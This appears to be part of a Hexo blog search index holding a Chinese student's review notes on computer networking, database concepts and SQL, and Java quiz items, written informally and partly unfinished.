        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成原理</title>
      <link href="2021/04/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
      <url>2021/04/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
      
      
      <categories>
          
          <category> 计算机组成原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络</title>
      <link href="2021/04/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
      <url>2021/04/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>ZSB：这实际上有好蓝吗？用心听，拉有什么好蓝度呢？</p><p>龙哥推荐的计算机网络复习，TTTTQQQQLLLL<a href="https://www.runoob.com/w3cnote/summary-of-network.html">点这里</a></p><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><h2 id="因特网发展的三个阶段"><a href="#因特网发展的三个阶段" class="headerlink" title="因特网发展的三个阶段"></a>因特网发展的三个阶段</h2><p><strong>第一阶段：从单个网络 ARPANET 向互联网发展的过程。</strong></p><ul><li><p>internet 和 Internet 的区别</p></li><li><p>internet泛指由多个计算机网络互连而成的网络。 </p></li><li><p>Internet是一个专用名词，它指当前全球最大的、开放的、由众多网络相互连接而成的特定计算机网络</p></li></ul><p><strong>第二阶段：建成了三级结构的互联网。(Internet 网)</strong></p><p><img src="/2021/04/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210612220539089.png" alt="image-20210612220539089" loading="lazy"></p><p>**第三阶段：逐渐形成了多层次 ISP 结构的互联网。 **</p><p><strong>出现了互联网服务提供者 ISP (Internet Service Provider)。</strong></p><ul><li><p>传统的三网：电信网，有线电视网，计算机网络</p></li><li><p>ISP 也分成为不同层次的 ISP：主干 ISP、地区 ISP 和 本地 ISP。</p></li></ul><p><img src="/2021/04/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210612220748352.png" alt="image-20210612220748352" loading="lazy"></p><h2 id="因特网的组成"><a href="#因特网的组成" class="headerlink" title="因特网的组成"></a>因特网的组成</h2><p>从因特网的工作方式上看，可以划分为以下的两大块（也称两类子网）：<br>(1) <strong>边缘部分</strong> :由所有连接在因特网上的主机组成。这部分是用户直接使用的，用来进行通信（传送数据、音频或视频）和资源共享。<br>(2) <strong>核心部分</strong> :由大量网络和连接这些网络的路由器组成。这部分是为边缘部分提供服务的（提供连通性和交换）。</p><p><img src="/2021/04/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210612222340989.png" alt="image-20210612222340989" loading="lazy"></p><p>在网络边缘的端系统中运行的程序之间的通信方式通常可划分为两大类：</p><ul><li><strong>客户—服务器方式（C/S 方式</strong>），即Client/Server方式 </li><li><strong>对等方式（P2P 方式）</strong> 即 Peer-to-Peer方式 ，不区分哪一个是服务请求方还是服务提供方</li></ul><p>在网络核心部分起特殊作用的是<strong>路由器(router)**。<br>路由器是实现</strong>分组交换(packet switching)**的关键构件，其任务是转发收到的分组，这是网络核心部分最重要的功能。（分组转发使用的是存储转发）</p><p><strong>三种交换的比较</strong> </p><p><img src="/2021/04/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210612223656307.png" alt="image-20210612223656307" loading="lazy"></p><h2 id="几种不同类别的网络"><a href="#几种不同类别的网络" class="headerlink" title="几种不同类别的网络"></a>几种不同类别的网络</h2><p>按照网络的作用范围进行分类</p><ul><li><p>**广域网 WAN (Wide Area Network)**：作用范围通常为几十到几千公里。</p></li><li><p>**城域网 MAN (Metropolitan Area Network)**：作用距离约为  5 ~ 50 公里。</p></li><li><p><strong>局域网 LAN (Local Area Network)</strong> ：局限在较小的范围（如 1 公里左右）。</p></li><li><p><strong>个人区域网 PAN (Personal Area Network)</strong> ：范围很小，大约在 10 米左右。</p><p>按照网络的使用者进行分类</p></li><li><p><strong>公用网 (public network)</strong><br>按规定交纳费用的人都可以使用的网络。因此也可称为公众网。</p></li><li><p><strong>专用网 (private network)</strong><br>为特殊业务工作的需要而建造的网络。</p></li></ul><h2 id="计算机网络的性能指标"><a href="#计算机网络的性能指标" class="headerlink" title="计算机网络的性能指标"></a>计算机网络的性能指标</h2><ol><li><p>速率</p><ol><li>比特（bit）是计算机中数据量的单位，也是信息论中使用的信息量的单位。</li><li>Bit 来源于 binary digit，意思是一个“二进制数字”，因此一个比特就是二进制数字中的一个 1 或 0。</li><li>速率即数据率(data rate)或比特率(bit rate)是计算机网络中最重要的一个性能指标。速率的单位是 b/s，或kb/s, Mb/s, Gb/s 等</li></ol></li><li><p>速率往往是指额定速率或标称速率。</p></li><li><p>带宽 </p><ol><li>​    “带宽”(bandwidth)本来（通讯领域）是指信号具有的频带宽度，单位是赫（或千赫、兆赫、吉赫等）。</li><li>现在“带宽”是数字信道所能传送的“最高数据率”的同义语，单位是“比特每秒”，或 b/s (bit/s)。</li></ol><p><img src="/2021/04/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210612225008810.png" alt="image-20210612225008810" loading="lazy">  </p></li><li><p>时延(计算简单来看就是时间等于路程除以速度)</p><ol><li><strong>发送时延</strong>    发送数据时，数据帧从结点进入到传输媒体所需要的时间。</li><li>也就是从发送数据帧的第一个比特算起，到该帧的最后一个比特发送完毕所需的时间。(结合书后题,会计算) </li></ol><p><img src="/2021/04/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210612225642291.png" alt="image-20210612225642291" loading="lazy"></p><ol><li><strong>传播时延</strong>    电磁波在信道中需要传播一定的距离而花费的时间（介质的物理性质决定P）。 (结合书后题,会计算) </li><li>信号发送速率和信号在信道上的传播速率是完全不同的概念。</li></ol><p><img src="/2021/04/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210612225833379.png" alt="image-20210612225833379" loading="lazy"></p><ol><li><p>处理时延    交换结点为存储转发而进行一些必要的处理所花费的时间。 </p></li><li><p>排队时延    结点缓存队列中分组排队所经历的时延。</p></li><li><p>排队时延的长短往往取决于网络中当时的通信量。</p></li><li><p>数据经历的总时延就是发送时延、传播时延、处理时延和排队时延之和： </p><p>总时延 = 发送时延+传播时延+处理时延+排队时延</p><p><img src="/2021/04/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210612232740724.png" alt="image-20210612232740724" loading="lazy"></p></li></ol></li><li><p>往返时间RTT</p><ol><li>送发送方发送开始，到发送方收到接收方的确认消息的时间。</li><li>ping</li></ol></li><li><p>利用率</p><ol><li>信道利用率指出某信道有百分之几的时间是被利用的（有数据通过）。完全空闲的信道的利用率是零</li></ol></li><li><p>网络利用率则是全网络的信道利用率的加权平均值。</p><ol start="3"><li>信道利用率并非越高越好。 </li></ol></li><li><p>所有的对网络的衡量指标</p><ol><li>速率</li><li>带宽</li><li>吞吐率</li><li>时延</li><li>时延带宽积</li><li>往返时间 RTT</li><li>利用率</li></ol></li></ol><h2 id="协议与划分层次"><a href="#协议与划分层次" class="headerlink" title="协议与划分层次"></a>协议与划分层次</h2><ul><li>网络协议(network protocol)，简称为协议，是为进行网络中的数据交换而建立的规则、标准或约定。 </li><li>协议是控制两个对等实体间通信规则的集合</li><li>要实现本层协议，必须要下一层提供的服务</li><li>协议组成要素:<br>语法:数据与控制信息的结构或格式<br>语义:需要发出何种控制信息，完成何种动作以及做出何种响应<br>同步:事件实现顺序的详细说明</li></ul><h2 id="五层协议"><a href="#五层协议" class="headerlink" title="五层协议"></a>五层协议</h2><p><img src="/2021/04/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210612234125144.png" alt="image-20210612234125144" loading="lazy"></p><h1 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h1><h2 id="物理层的主要任务"><a href="#物理层的主要任务" class="headerlink" title="物理层的主要任务"></a>物理层的主要任务</h2><p>主要任务：确定与传输媒体的接口的一些特性。</p><ul><li><strong>机械特性</strong> ：指明接口所用接线器的形状和尺寸、引线数目和排列、固定和锁定装置等（举例：网卡，网线）。</li><li><strong>电气特性</strong>：指明在接口电缆的各条线上出现的电压的范围。</li><li><strong>功能特性</strong>：指明某条线上出现的某一电平的电压表示何种意义。</li><li><strong>过程特性</strong> ：指明对于不同功能的各种可能事件的出现顺序（例如：网卡的同步信号 连续8个高电压）。 </li></ul><h2 id="物理层下面的传输媒体"><a href="#物理层下面的传输媒体" class="headerlink" title="物理层下面的传输媒体"></a>物理层下面的传输媒体</h2><ul><li><strong>传输媒体也称为传输介质或传输媒介</strong>，它就是数据传输系统中在发送器和接收器之间的物理通路。</li><li>传输媒体可分为两大类，即导引型传输媒体和非导引型传输媒体。</li><li><strong>在导引型传输媒体中</strong>，电磁波被导引沿着固体媒体（铜线或光纤）传播。<strong>有线</strong></li><li><strong>非导引型传输媒体就是指自由空间</strong>。在非导引型传输媒体中，电磁波的传输常称为<strong>无线传输</strong>。</li></ul><h2 id="导引型传输媒体-会认图"><a href="#导引型传输媒体-会认图" class="headerlink" title="导引型传输媒体-会认图"></a>导引型传输媒体-会认图</h2><ul><li>双绞线、</li></ul><p><img src="/2021/04/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210613013735147.png" alt="image-20210613013735147" loading="lazy"></p><ul><li>同轴电缆</li></ul><p><img src="/2021/04/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210613013828029.png" alt="image-20210613013828029" loading="lazy"></p><ul><li>光缆<br>光纤是光纤通信的传输媒体。<br>由于可见光的频率非常高，约为 10^8 MHz 的量级，因此一个光纤通信系统的传输带宽远远大于目前其他各种传输媒体的带宽。</li></ul><h2 id="几个术语"><a href="#几个术语" class="headerlink" title="几个术语"></a>几个术语</h2><ul><li>数据(data)——运送消息的实体。</li><li>信号(signal)——数据的电气的或电磁的表现。 </li><li>“模拟的”(analogous)——代表消息的参数的取值是连续的。 </li><li>“数字的”(digital)——代表消息的参数的取值是离散的。 </li><li>码元(code)——在使用时间域（或简称为时域）的波形表示数字信号时，代表不同离散数值的基本波形</li><li>信噪比：信号的平均功率和噪声的平均功率之比</li></ul><h2 id="信道的通信方式"><a href="#信道的通信方式" class="headerlink" title="信道的通信方式"></a>信道的通信方式</h2><ul><li><p>单向通信（单工通信）——只能有一个方向的通信而没有反方向的交互。</p></li><li><p>双向交替通信（半双工通信）——通信的双方都可以发送信息，但不能双方同时发送(当然也就不能同时接收)。</p></li><li><p>双向同时通信（全双工通信）——通信的双方可以同时发送和接收信息。</p></li><li><p>调制分为两大类：</p><ul><li>基带调制：仅对基带信号的波形进行变换，使它能够与信道特性相适应。变换后的信号仍然是基带信号。把这种过程称为编码 (coding)。</li><li>带通调制：使用载波 (carrier)进行调制，把基带信号的频率范围搬移到较高的频段，并转换为模拟信号，这样就能够更好地在模拟信道中传输（即仅在一段频率范围内能够通过信道） 。<br>带通信号 ：经过载波调制后的信号。 </li></ul></li><li><p>最基本的二元制调制方法有以下几种：</p><ul><li>调幅(AM)：载波的振幅随基带数字信号而变化。 </li><li>调频(FM)：载波的频率随基带数字信号而变化。</li><li>调相(PM) ：载波的初始相位随基带数字信号而变化。</li></ul><p><img src="/2021/04/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210613014611627.png" alt="image-20210613014611627" loading="lazy"></p></li><li><p>常用编码方式</p><ul><li>不归零制：正电平代表 1，负电平代表 0。</li><li>归零制：正脉冲代表 1，负脉冲代表 0。</li><li>曼彻斯特编码：位周期中心的向上跳变代表 0，位周期中心的向下跳变代表 1。但也可反过来定义。</li><li>差分曼彻斯特编码：在每一位的中心处始终都有跳变。位开始边界有跳变代表 0，而位开始边界没有跳变代表 1。</li></ul><p><img src="/2021/04/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210613014827306.png" alt="image-20210613014827306" loading="lazy"></p><ul><li>从信号波形中可以看出，曼彻斯特 (Manchester) 编码和差分曼彻斯特编码产生的信号频率比不归零制高。</li><li>从自同步能力来看，不归零制不能从信号波形本身中提取信号时钟频率（这叫作没有自同步能力），而曼彻斯特编码和差分曼彻斯特编码具有<strong>自同步能力</strong>。</li></ul></li></ul><h1 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h1><h1 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h1><p>网络层就是尽力转发数据，干这件事它已经精疲力尽了，别压榨了，别压榨了。</p><p>中间设备是<strong>路由器</strong>（也叫网关）</p><p>网际协议IP</p><p>与其配套使用的有三个协议</p><p>ARP地址解析协议</p><p>ICMP网际控制报文协议</p><p>IGMP国际组管理协议</p><p>直接交付：不需要经过路由器</p><p>间接交付：经过路由器转</p><p>分类的IP,看第一个十进制（A类:0-127,B类:128-191,C类:192-223）</p><p>网络字段全0表示自己，不能作为目的地址，全1表示广播，不能作为源地址</p><p>太难了，更个屁，sajkadjasopdnsnxasljcnasjbcasjkbcasjbalk</p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库</title>
      <link href="2021/04/17/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
      <url>2021/04/17/%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>一个数据模型至少需要描述数据的静态特征、动态特征和（ <strong>完整性约束</strong> ）三项内容。</p><p>(<strong>DB</strong> )是长期存储在计算机内的有组织、可共享的数据集合。 </p><p>关于关系，下列说法中正确的是<br><strong>Ⅰ.关系中的每一个属性都是不可再分解的</strong><br><strong>Ⅱ.关系中不允许出现取值完全相同的元组</strong><br><strong>Ⅲ.可以不考虑关系中各元组的顺序</strong><br><strong>Ⅳ.可以不考虑关系中各属性的顺序</strong></p><p>对现实世界进行第一层抽象的模型，称为（）模型；对现实世界进行第二层抽象的模型，称为（）模型。 <strong>概念，结构/逻辑</strong></p><p>在E-R图中，用来表示属性的图形是（    ） <strong>椭圆形</strong> </p><p>SQL语言中用（ <strong>rollback</strong>）语句实现事务的回滚</p><p>触发器是一种特殊类型的存储过程，它不同于存储过程。</p><p>视图和表不一样，不是在物理上存在的一种数据库对象。</p><p>在SQL语言中的视图VIEW是数据库的（ <strong>外模式</strong>） 。</p><p>下列关于关系数据库的操作特点的说法，正确的是<br>    A. 需要指明操作的要求和操作的实现过程<br>    <strong>B. 需要指明操作的要求，但不需要指明操作的实现过程    √</strong><br>    C. 需要指明操作的实现过程，但不需要指明操作的要求<br>    D. 对操作要求和操作实现过程都不需要指明</p><p>下述对出生日期进行比较的表达式中，正确的是<br>    A. 出生日期 &gt;‘1980/1/1’</p><p>从一个表中筛选数据向另一个已经存在的表添加所用的命令是（ <strong>INSERT…SELECT</strong>    ）。</p><p>若要在基本表中增加一列CN（课程名），可用（ <strong>alter table s add (cn char(8))</strong> ）</p><p>查找表结构用以下哪一项（  <strong>DESC</strong>）</p><p> 在SQL Server中，在表中添加一个新列的正确SQL语句是 <strong>B. ALTER TABLE ADD 新列名 数据类型</strong></p><p>数据类型Numeric(10,4)表示的数据是 <strong>小数点后边有4位数字，小数点前边有6位数字</strong></p><p>TRUNCATE TABLE相当于无条件的DELETE FROM</p><p>数据库的( <strong>完整性</strong>)是 指数据的正确性和相容性。</p><p>数据模型的三要素是<strong>数据结构、数据操作和数据完整性约束</strong></p><p>数据模型的三要素  <strong>数据结构 ，完整性约束，数据操纵</strong></p><p>二维表结构是<strong>关系数据库采用的组织层数据模型</strong></p><p>文件系统具有的数据独立性是(.<strong>设备独立性</strong> )。</p><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><pre class="line-numbers language-none"><code class="language-none">事务（1）原子性：整个事务中的所有操作，要么全部完成，要么全部不完成，不可能停滞在中间某个环节。事务在执行过程中发生错误，会被回滚（Rollback）到事务开始前的状态，就像这个事务从来没有执行过一样。   （2）一致性：在事务开始之前和事务结束以后，数据库的完整性约束没有被破坏。   （3）隔离性：隔离状态执行事务，使它们好像是系统在给定时间内执行的唯一操作。如果有两个事务，运行在相同的时间内，执行 相同的功能，事务的隔离性将确保每一事务在系统中认为只有该事务在使用系统。这种属性有时称为串行化，为了防止事务操作间的混淆，  必须串行化或序列化请 求，使得在同一时间仅有一个请求用于同一数据。   （4）持久性：在事务完成以后，该事务所对数据库所作的更改便持久的保存在数据库之中，并不会被回滚。删除操作drop:视图，表table,列columndelete<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>from </li><li>join </li><li>on </li><li>where </li><li>group by(开始使用select中的别名，后面的语句中都可以使用)</li><li> avg,sum…. </li><li>having </li><li>select </li><li>distinct </li><li>order by</li><li>limit<br>从这个顺序中我们不难发现，所有的 查询语句都是从from开始执行的，在执行过程中，每个步骤都会为下一个步骤生成一个虚拟表，这个虚拟表将作为下一个执行步骤的输入。 </li></ol><p><strong>第一步：</strong>首先对from子句中的前两个表执行一个笛卡尔乘积，此时生成虚拟表 vt1（选择相对小的表做基础表）。<br><strong>第二步：</strong>接下来便是应用on筛选器，on 中的逻辑表达式将应用到 vt1 中的各个行，筛选出满足on逻辑表达式的行，生成虚拟表 vt2 。<br><strong>第三步：</strong>如果是outer join 那么这一步就将添加外部行，left outer jion 就把左表在第二步中过滤的添加进来，如果是right outer join 那么就将右表在第二步中过滤掉的行添加进来，这样生成虚拟表 vt3 。</p><p><strong>第四步：</strong>如果 from 子句中的表数目多余两个表，那么就将vt3和第三个表连接从而计算笛卡尔乘积，生成虚拟表，该过程就是一个重复1-3的步骤，最终得到一个新的虚拟表 vt3。 </p><p><strong>第五步：</strong>应用where筛选器，对上一步生产的虚拟表引用where筛选器，生成虚拟表vt4，在这有个比较重要的细节不得不说一下，对于包含outer join子句的查询，就有一个让人感到困惑的问题，到底在on筛选器还是用where筛选器指定逻辑表达式呢？on和where的最大区别在于，如果在on应用逻辑表达式那么在第三步outer join中还可以把移除的行再次添加回来，而where的移除的最终的。举个简单的例子，有一个学生表（班级,姓名）和一个成绩表(姓名,成绩)，我现在需要返回一个x班级的全体同学的成绩，但是这个班级有几个学生缺考，也就是说在成绩表中没有记录。为了得到我们预期的结果我们就需要在on子句指定学生和成绩表的关系（学生.姓名=成绩.姓名）那么我们是否发现在执行第二步的时候，对于没有参加考试的学生记录就不会出现在vt2中，因为他们被on的逻辑表达式过滤掉了,但是我们用left outer join就可以把左表（学生）中没有参加考试的学生找回来，因为我们想返回的是x班级的所有学生，如果在on中应用学生.班级=’x’的话，left outer join会把x班级的所有学生记录找回（感谢网友康钦谋__康钦苗的指正），所以只能在where筛选器中应用学生.班级=’x’ 因为它的过滤是最终的。 </p><p><strong>第六步：</strong>group by 子句将中的唯一的值组合成为一组，得到虚拟表vt5。如果应用了group by，那么后面的所有步骤都只能得到的vt5的列或者是聚合函数（count、sum、avg等）。原因在于最终的结果集中只为每个组包含一行。这一点请牢记。 </p><p><strong>第七步：</strong>应用cube或者rollup选项，为vt5生成超组，生成vt6.<br><strong>第八步：</strong>应用having筛选器，生成vt7。having筛选器是第一个也是为唯一一个应用到已分组数据的筛选器。<br><strong>第九步：</strong>处理select子句。将vt7中的在select中出现的列筛选出来。生成vt8. </p><p><strong>第十步：</strong>应用distinct子句，vt8中移除相同的行，生成vt9。事实上如果应用了group by子句那么distinct是多余的，原因同样在于，分组的时候是将列中唯一的值分成一组，同时只为每一组返回一行记录，那么所以的记录都将是不相同的。 </p><p><strong>第十一步：</strong>应用order by子句。按照order_by_condition排序vt9，此时返回的一个游标，而不是虚拟表。sql是基于集合的理论的，集合不会预先对他的行排序，它只是成员的逻辑集合，成员的顺序是无关紧要的。对表进行排序的查询可以返回一个对象，这个对象包含特定的物理顺序的逻辑组织。这个对象就叫游标。正因为返回值是游标，那么使用order by 子句查询不能应用于表表达式。排序是很需要成本的，除非你必须要排序，否则最好不要指定order by，最后，在这一步中是第一个也是唯一一个可以使用select列表中别名的步骤。 </p><p><strong>第十二步：</strong>应用top选项。此时才返回结果给请求者即用户。 </p><h3 id="一些语句"><a href="#一些语句" class="headerlink" title="一些语句"></a>一些语句</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">between</span> <span class="token number">30</span> <span class="token operator">and</span> <span class="token number">40</span><span class="token keyword">case</span><span class="token keyword">when</span> 订单状态<span class="token operator">=</span><span class="token string">'1'</span> <span class="token keyword">then</span> <span class="token string">'等待出库'</span><span class="token keyword">when</span> 订单状态<span class="token operator">=</span><span class="token string">'2'</span> <span class="token keyword">then</span> <span class="token string">'已发货'</span><span class="token keyword">when</span> 订单状态<span class="token operator">=</span><span class="token string">'3'</span> <span class="token keyword">then</span> <span class="token string">'已完成'</span><span class="token keyword">end</span>substring<span class="token punctuation">(</span>姓名<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">//从第1个字符开始 只截取之后的1个字符</span><span class="token keyword">select</span> <span class="token keyword">distinct</span> 城市<span class="token comment">//去重复</span><span class="token keyword">from</span> 购物者<span class="token keyword">create</span> <span class="token keyword">proc</span> prc_score<span class="token variable">@sno</span> <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token keyword">as</span><span class="token keyword">begin</span><span class="token keyword">select</span> sname <span class="token keyword">as</span> 姓名<span class="token punctuation">,</span><span class="token function">avg</span><span class="token punctuation">(</span>grade<span class="token punctuation">)</span> <span class="token keyword">as</span> 平均分数<span class="token keyword">from</span> S<span class="token punctuation">,</span>SC<span class="token keyword">where</span> s<span class="token punctuation">.</span>sno<span class="token operator">=</span>sc<span class="token punctuation">.</span>sno<span class="token operator">and</span> s<span class="token punctuation">.</span>sno<span class="token operator">=</span><span class="token variable">@sno</span><span class="token keyword">group</span> <span class="token keyword">by</span> sname<span class="token keyword">end</span><span class="token keyword">exists</span><span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span class="token keyword">if</span> <span class="token operator">not</span> <span class="token keyword">exists</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> tuser <span class="token keyword">where</span> uid<span class="token operator">=</span><span class="token variable">@uid</span><span class="token punctuation">)</span><span class="token keyword">select</span> <span class="token string">'-1'</span><span class="token keyword">else</span><span class="token keyword">if</span> <span class="token operator">not</span> <span class="token keyword">exists</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> tuser <span class="token keyword">where</span> upwd<span class="token operator">=</span><span class="token variable">@upwd</span><span class="token punctuation">)</span><span class="token keyword">select</span> <span class="token string">'-2'</span>   <span class="token keyword">else</span>     <span class="token keyword">select</span>   <span class="token string">'0'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA</title>
      <link href="2021/04/17/JAVA/"/>
      <url>2021/04/17/JAVA/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h1><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><pre class="line-numbers language-none"><code class="language-none">程序不能选择忽略事件。   错java 不能重写在超类中定义的静态方法构造方法可以是静态的数组中的元素可以不是是基元数据类型。比如指针,结构体型在Java 1.8中，“检查异常”必须在程序中处理。Java允许创建不规则数组，即Java多维数组中各行的列数可以不同。( )一个Java类可以不能有多个父类。声明为final的方法不能在子类中被覆盖。一个非抽象类不可以有选择地实现接口的部分抽象方法。    要实现所有，抽象类才能有选择受保护的数据或方法可以由任何包中的子类访问。受保护的数据或方法不可以由不同包中的任何类访问元注解不能用于注解Java程序中的类的成员方法。final类可以有实例，不能拓展子类和父类可以不在一个包中如果方法中发生必检异常，则必须捕获该异常或在其方法头中声明该异常。在Java程序中，不能使用protected来修饰一个类。抽象类是不能实例化的。类及其属性、方法可以同时有一个以上的修饰符来修饰。private 修饰的成员变量或方法的可见范围为当前类。 没有权限修饰符修饰的成员变量或方法的可见范围为当前包。 protected 修饰的成员变量或方法的可见范围是当前包及该类的子类，即可以被同一个包、该类的子类（可以不同包）的方法访问。 public修饰的成员变量或方法可以被所有包中所有类中的方法访问java应用程序经过编译后会产生一个以（.class ）为扩展名的字节码文件,Java应用程序源文件的扩展名为(java )。Java应用程序由若干个类所构成,这些类可以在一个源文件中,也可以分布在若干个源文件中,其中必须有一个源文件含有主类。sizeof不是java关键字abstract修饰抽象类抽象方法，抽象类一定要被继承，抽象方法一定要被重写自动转换次序.byte-&gt;short-&gt;int-&gt;long-&gt;float-&gt;double定义合法标识符规则： （1）由26个英文字母大小写，0-9 ，_或 $ 组成 （2）数字不可以开头。 （3）不可以使用关键字和保留字，但能包含关键字和保留字 （4）Java中严格区分大小写，长度无限制 （5）标识符不能包含空格class表示___类;类对象__; *.class表示___类文件___; *.java表示__java文件___; java文件编译后是___class;类__文件A.构造方法的主要作用是完成对类的对象的初始化工作B.构造方法的返回类型只能是void型，即在方法名前加void    错C.一般在创建新对象时，系统会自动调用构造方法D.构造方法是类的一种特殊方法，它的方法名必须与类名相同一个Java文件中可以定义有多个class声明，并且类名称可以与文件名称同名(1)final类不能实现任何接口。(2)public接口可以被任何一个类实现。(3)友好类和它所实现的接口必须在一个包里。(4)如果一个类和友好接口在同一个包里，就允许它实现该接口。  13错<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">switch</span><span class="token punctuation">(</span>变量<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>　　　　　　<span class="token keyword">case</span> 值<span class="token operator">:</span>要执行的语句<span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span>　　　　　　…　　　　　　<span class="token keyword">default</span><span class="token operator">:</span>要执行的语句<span class="token punctuation">;</span>　　　　<span class="token punctuation">&#125;</span><span class="token class-name">Scanner</span> num<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span>nextLine（）方法返回的是<span class="token class-name">Enter</span>键之前的所有字符，它是可以得到带空格的字符串的。next（）会自动消去有效字符前的空格，只返回输入的字符，不能得到带空格的字符串。    （简单点说，next我只要字，nextLine我啥都要）    <span class="token number">1.</span>十进制转成二进制<span class="token class-name">String</span> s <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">toBinaryString</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>  <span class="token comment">//将十进制数转成字符串，例如n=5 ，s = "101"</span><span class="token number">2.</span>将字符串转成整形<span class="token keyword">int</span> a <span class="token 